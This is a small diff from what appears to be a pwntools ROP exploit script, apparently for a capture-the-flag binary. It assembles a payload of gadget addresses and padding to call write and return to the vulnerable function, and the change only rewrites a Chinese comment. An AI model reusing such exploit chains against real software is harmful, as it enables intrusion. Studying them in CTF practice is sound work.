@@ -33,7 +33,7 @@ payload1 += p64(8)# pop r15
 # 调用第二段gadget
 # 将r13d, r14, r15分别写入rdi, rsi, rdx并执行write
 payload1 += p64(gadget2)
-payload1 += b'\0' * (8 * 7) # 填充6个pop和add rsp, 8
+payload1 += b'\0' * (8 * 7) # add rsp, 8和填充6个pop
 payload1 += p64(vuln)
 
 p.recvuntil('Please:\n')
